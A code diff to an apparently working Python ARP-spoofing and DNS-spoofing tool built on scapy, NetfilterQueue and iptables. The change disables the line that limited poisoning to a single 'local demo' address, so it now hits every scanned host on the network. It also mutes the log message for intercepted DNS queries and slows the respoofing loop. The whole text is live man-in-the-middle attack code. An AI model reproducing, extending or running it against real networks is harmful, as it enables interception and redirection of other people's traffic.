@@ -6,8 +6,6 @@ from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR
 from netfilterqueue import NetfilterQueue
 from math import log2
 import time
-
-#import threading
 import multiprocessing
 
 from netfilterqueue import NetfilterQueue
@@ -59,7 +57,7 @@ def send_fake_arp():
 		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
 		
 		# Local demo use
-		if i != '192.168.0.163': continue;
+		# if i != '192.168.0.163': continue;
 
 		send(arp_to_victim, verbose=False)
 		send(arp_to_router, verbose=False)
@@ -85,7 +83,7 @@ def callback(pkt):
 		del spkt[UDP].len
 		del spkt[UDP].chksum
 
-		print("Got one target DNS query!")
+		# print("Got one target DNS query!")
 		pkt.set_payload(bytes(spkt))
 
 	pkt.accept()
@@ -110,14 +108,13 @@ def main():
 	arp_scan()
 	send_fake_arp()
 
-# trd = threading.Thread(target = fake_dns)
 	trd = multiprocessing.Process(target = fake_dns, args=())
 	trd.start()
 
 	while True:
 		try:
 			send_fake_arp()
-			time.sleep(2)
+			time.sleep(5)
 		except KeyboardInterrupt:
 			system('iptables -D FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
 			system('iptables -D FORWARD -j REJECT -p tcp --sport 53')
